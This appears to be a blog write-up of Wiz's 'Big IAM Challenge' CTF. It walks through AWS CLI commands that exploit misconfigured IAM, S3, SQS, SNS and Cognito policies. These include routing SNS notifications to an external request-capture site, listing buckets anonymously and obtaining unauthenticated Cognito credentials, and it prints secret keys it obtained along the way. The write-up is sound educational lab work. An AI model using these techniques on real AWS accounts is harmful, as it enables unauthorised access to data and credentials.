---
title:  "AWS Big IAM Challenge"
date:   2024-01-07
categories: Cybersecurity Cloud-Computing
---

![card](/assets/images/bigiamchallenge/image.png)

This is a WriteUp of the [WIZ][link] "The Big IAM Challenge". The challenge is a cloud security CTF about identifiying and exploiting AWS IAM misconfigurations in six different tasks, with a given hint, IAM policy and AWS CLI console.

## Challenge 1 - Buckets of Fun
The given hint:
> We all know that public buckets are risky. But can you find the flag?

The given IAM policy:
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

First I checked the IAM Identity configured in the console.
```
> aws sts get-caller-identity
{
    "UserId": "AROAZSFITKRSYE6ELQP2Q:iam_shell",
    "Account": "657483584613",
    "Arn": "arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell"
}
```

Since the IAM policy does not restrict any principals, instead using the wildcard `*`, our user `iam_shell` should be able to list the bucket `thebigiamchallenge-storage-9979f4b` and the files within.

```
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
2023-06-05 19:13:53         37 flag1.txt
2023-06-08 19:18:24      81889 logo.png
```

```
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/
Completed 37 Bytes/37 Bytes (659 Bytes/s) with 1 file(s) remainingdownload: s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt to ../../tmp/flag1.txt
```

```
> cat /tmp/flag1.txt
{wiz:exposed-storage-risky-as-usual}
```


## Challenge 2 - <s>Google</s> Analytics

The given hint:
> We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong? Join our queue and get the secret flag.

The given IAM policy:
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

We are allowed to send and receive messages from the `wiz-tbic-analytics-sqs-queue-ca7a1b2` queue. So I tried receiving something.

```
> aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "d5a0db64-7580-44db-8ee0-a9fc0660e9b4",
            "ReceiptHandle": "LONG_AND_UNIMPORTANT",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}
```

Accessing the URL given in the body of the message, gets us the flag.

```
> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```

## Challenge 3 - Enable Push Notifications
The given hint:
> We got a message for you. Can you get it?

The given IAM policy:

```
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

The policy allows subscribing to the notification system `TBICWizPushNotifications`, however only if our endpoint end in `@tbic.wiz.io`. This is meant to only allow internal e-mail addresses to subscribe to the system.


```
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint robin@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
```

This doesn't help me at all, since I don't have access to the e-mail `robin@tbic.wiz.io`. This restriction can be bypassed, by using a webserver as the endpoint instead of an e-mail address and appending `@tbic.wiz.io` as a subdirectory. I used [Request Basket][rbasket] to inspect incoming HTTP requests.

```
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://rbaskets.in/ulrh6ff/@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
```

In the basket I saw a first notification, which prompted me to validate my subscription attempt by opening a specific URL and after that I got a second notification containing the flag.

![flag3](/assets/images/bigiamchallenge/image2.png)



## Challenge 4 - Admin only?
The given hint: 
> We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

The given IAM policy:
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```
The policy allows getting objects without any restrictions for the whole buckets, this means, if I know the name of the file I want to download I can do it!

```
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag.txt /tmp/
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

Sadly I don't...Listing the contents of the buckets has an additional condition, which states that for all values present in `aws:PrincipalArn`, they need to look like `arn:aws:iam::133713371337:user/admin`. `ForAllValues:StringLike` is a bad way to restrict access, because it does the condition for all values **present**. This means if there are no values present, the condition is fullfilled. I learned this [here][forallvalues]. We may list the content of the bucket, by not loading the credentials using the `--no-sign-request` parameter.

```
> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
2023-06-07 19:15:43         42 flag-as-admin.txt
2023-06-08 19:20:01      81889 logo-admin.png
```

```
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/
Completed 42 Bytes/42 Bytes (454 Bytes/s) with 1 file(s) remainingdownload: s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt to ../../tmp
/flag-as-admin.txt
```

```
> cat ../../tmp/flag-as-admin.txt
{wiz:principal-arn-is-not-what-you-think}
```

## Challenge 5 - Do I know you?
The given hint: 
> We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.

The given IAM policy:
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

The policy seems to be added to an Cognito identity pool. It is possible that the pool is configured to allow anonymous authentication. To test this we need the identity pool ID associated with it. This is found in the source code of the challenge website in a script tag.

```
  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});
  // Set the region
  AWS.config.update({region: 'us-east-1'});

  $(document).ready(function() {
    var s3 = new AWS.S3();
    params = {
      Bucket: 'wiz-privatefiles',
      Key: 'cognito1.png',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params, function (err, url) {
      $('#signedImg').attr('src', url);
    });
});
```

Using the pool ID, we can request a Cognito ID.
```
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:8942d0d9-2a33-4114-9c1c-664a7a785856"
}
```

And for this identity, we now can request credentials.
```
> aws cognito-identity get-credentials-for-identity --identity-id us-east-1:8942d0d9-2a33-4114-9c1c-664a7a785856
{
    "IdentityId": "us-east-1:8942d0d9-2a33-4114-9c1c-664a7a785856",
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXIIKE466O",
        "SecretKey": "tS1WxVdGq5VaG/tii3kBXX+5+1C3V+8fhjNHKTW/",
        "SessionToken": "LONG_SESSION_TOKEN",        
        "Expiration": 1704627931.0
}
```

I set the three environment variables `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` to the given credentials on my own host, which led to the following access:

```
$ aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials"
}
```

With this I could now access the bucket and flag.
```
$ aws s3 ls s3://wiz-privatefiles/
2023-06-05 21:42:27       4220 cognito1.png
2023-06-05 15:28:35         37 flag1.txt
```

```
$ aws s3 cp s3://wiz-privatefiles/flag1.txt .
download: s3://wiz-privatefiles/flag1.txt to ./flag1.txt  
```

```
$ cat flag1.txt 
{wiz:incognito-is-always-suspicious}
```

## Challenge 6 - One final push
The given hint: 
> Anonymous access no more. Let's see what can you do now. Now try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role

The given IAM policy:
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

The policy shows us, that the access control is federated to Cognito and we have the permission to assume a role using a web identity, but only if our identity is from the pool `us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b`. This is the same pool as in the last challenge, so we can reuse the previously gained Cognito ID. With this we can now get a OID token.

```
> aws cognito-identity get-open-id-token --identity-id us-east-1:8942d0d9-2a33-4114-9c1c-664a7a785856
{
    "IdentityId": "us-east-1:8942d0d9-2a33-4114-9c1c-664a7a785856",
    "Token": "LONG_OID_TOKEN"
}
```

With this token, we can assume the role of `arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role`.

```
> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name s3access --web-identity-token LONG_OID_TOKEN

{
    "Credentials": {
        "AccessKeyId": "",
        "SecretAccessKey": "Zz/6c7MRKJwUa1V+dzGZDaxfIkxmbPtB9rLv/mdm",
        "SessionToken": "LONG_SESSION_TOKEN",
        "Expiration": "2024-01-07T13:23:28Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:8942d0d9-2a33-4114-9c1c-664a7a785856",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:s3access",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/s3access"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
```

I again set the environment variables locally.
```
$ aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXASFTNOIZG:s3access",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/s3access"
}
```

We didn't get any information on buckets, so I just checked, if I can look at all of them.

```
$ aws s3api list-buckets
{
    "Buckets": [
        {
            "Name": "tbic-wiz-analytics-bucket-b44867f",
            "CreationDate": "2023-06-04T17:07:29+00:00"
        },
        {
            "Name": "thebigiamchallenge-admin-storage-abf1321",
            "CreationDate": "2023-06-05T13:07:44+00:00"
        },
        {
            "Name": "thebigiamchallenge-storage-9979f4b",
            "CreationDate": "2023-06-04T16:31:02+00:00"
        },
        {
            "Name": "wiz-privatefiles",
            "CreationDate": "2023-06-05T13:28:31+00:00"
        },
        {
            "Name": "wiz-privatefiles-x1000",
            "CreationDate": "2023-06-05T13:28:31+00:00"
        }
    ],
    "Owner": {
        "DisplayName": "shir+ctf",
        "ID": "37ec5af87b339325fbafa92e65fbd5f5ab4bcd7e733fa76838720554da48d3f9"
    }
}
```

The only bucket I didn't look into yet is `wiz-privatefiles-x1000`. This bucket contained the last flag.

```
$ aws s3 ls s3://wiz-privatefiles-x1000/
2023-06-05 21:42:27       4220 cognito2.png
2023-06-05 15:28:35         40 flag2.txt
```

```
$ aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt .
download: s3://wiz-privatefiles-x1000/flag2.txt to ./flag2.txt   
```

```
$ cat flag2.txt 
{wiz:open-sesame-or-shell-i-say-openid}
```

## Reflection
![cert](/assets/images/bigiamchallenge/image3.png)

At the end I got a nice [certificate][finished]. It has been a while since I worked with IAM policies and I never worked with the Cognito system before, so the later challenges were a little harder for me. Pretty fun though!




[link]: https://www.wiz.io/blog/the-big-iam-challenge
[rbasket]: https://rbaskets.in
[forallvalues]: https://awstip.com/creating-unintentional-ways-to-bypass-aws-iam-policies-when-using-the-forallvalues-operator-3516a7f17ed0
[finished]: https://bigiamchallenge.com/finisher/7TZWgQ7E